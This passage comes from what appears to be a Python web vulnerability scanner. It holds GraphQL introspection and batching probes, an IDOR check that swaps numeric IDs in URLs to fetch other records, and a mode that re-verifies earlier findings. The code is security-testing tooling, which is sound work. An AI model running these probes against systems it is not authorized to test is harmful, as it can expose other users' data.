        endpoints = ["/graphql", "/api/graphql", "/nerdgraph/graphql", "/v1/graphql", "/query"]
        introspection_query = {"query": "{ __schema { types { name } } }"}
        batch_payload = [{"query": "{ __typename }"}] * 50
        headers = {"Content-Type": "application/json"}

        for ep in endpoints:
            url = self.base_url + ep
            try:
                r = self.session.post(url, json=introspection_query, headers=headers, timeout=self.timeout)
                if r.status_code == 200 and "__schema" in r.text:
                    f = finding(
                        vuln_type="GraphQL Introspection Enabled",
                        url=url,
                        severity="medium",
                        details="Full schema is exposed via introspection.",
                        evidence="__schema",
                        verification_stage=VerificationStage.VALIDATED.value,
                        validation_steps=["GraphQL introspection response received"],
                    )
                    if f:
                        self._add(f)
            except Exception:
                continue

            try:
                r = self.session.post(url, json=batch_payload, headers=headers, timeout=self.timeout)
                if r.status_code == 200 and isinstance(r.json(), list) and len(r.json()) > 1:
                    f = finding(
                        vuln_type="GraphQL Query Batching Unrestricted",
                        url=url,
                        severity="medium",
                        details="Server accepts batched GraphQL arrays with no apparent limit.",
                        evidence="__typename",
                        verification_stage=VerificationStage.DETECTED.value,
                    )
                    if f:
                        self._add(f)
            except Exception:
                pass

        return self._get_findings()

    # ═════════════════════════════════════════════════════════════════════
    # IDOR (legacy, kept for backward compat in scanner.py)
    # ═════════════════════════════════════════════════════════════════════

    def scan_idor(self) -> list[dict]:
        findings: list[dict] = []
        id_patterns = [
            (re.compile(r"[?&](account|accountId|account_id|user|userId|user_id|org|orgId|org_id|id|guid|uuid|ref)=([0-9a-f\-]{4,36})", re.IGNORECASE), "param"),
            (re.compile(r"/(accounts|users|orgs|organisations|entities)/([0-9a-f\-]{4,36})", re.IGNORECASE), "path"),
        ]
        candidates = []

        for url in self.recon.get("urls", []):
            for pattern, ref_type in id_patterns:
                for m in pattern.finditer(url):
                    candidates.append({"url": url, "param": m.group(1), "value": m.group(2), "type": ref_type})

        seen = set()
        for c in candidates:
            key = (c["param"], c["value"])
            if key in seen:
                continue
            seen.add(key)
            original_val = c["value"]
            original_url = c["url"]
            baseline = safe_get(self.session, original_url, self.timeout, raise_for_status=False)
            if not baseline:
                continue

            if original_val.isdigit():
                for delta in [-1, 1, -100, 100]:
                    test_val = str(int(original_val) + delta)
                    test_url = original_url.replace(original_val, test_val, 1)
                    r = safe_get(self.session, test_url, self.timeout, raise_for_status=False)
                    if r and r.status_code == 200 and len(r.text) > 500 and abs(len(r.text) - len(baseline.text)) < 5000 and r.text != baseline.text:
                        f = finding(
                            vuln_type="Potential IDOR",
                            url=test_url,
                            severity="critical",
                            details=f"Parameter '{c['param']}' changed from {original_val} to {test_val} and returned non-identical content.",
                            evidence=r.text[:120],
                            verification_stage=VerificationStage.DETECTED.value,
                        )
                        if f:
                            self._add(f)

        return self._get_findings()

    # ═════════════════════════════════════════════════════════════════════
    # Verify-only mode
    # ═════════════════════════════════════════════════════════════════════

    @staticmethod
    def verify_report(report_path: str, config: dict) -> list[dict]:
        import json
        try:
            with open(report_path, "r") as f:
                data = json.load(f)
        except (FileNotFoundError, json.JSONDecodeError) as e:
            log(f"[!] Cannot load report: {e}", Colors.RED)
            return []

        old_findings = data.get("findings", [])
        if not old_findings:
            log("[!] No findings to verify", Colors.YELLOW)
            return []

        config["verify_only"] = True
        scanner = VulnScanner(config, data.get("recon_data", {}))
        verified: list[dict] = []
        log(f"[*] Verifying {len(old_findings)} finding(s) …", Colors.CYAN)

        for f in old_findings:
            url = f.get("url", "")
            evidence = f.get("evidence", "")
            if not url:
                continue
            try:
                r = scanner.session.get(url, timeout=scanner.timeout)
                confirmed = evidence in r.text if evidence else r.status_code < 500
                f["confirmed"] = confirmed
                f["last_verified"] = datetime.now(timezone.utc).isoformat()
                verified.append(f)
            except Exception:
                f["confirmed"] = False
                verified.append(f)

        return verified
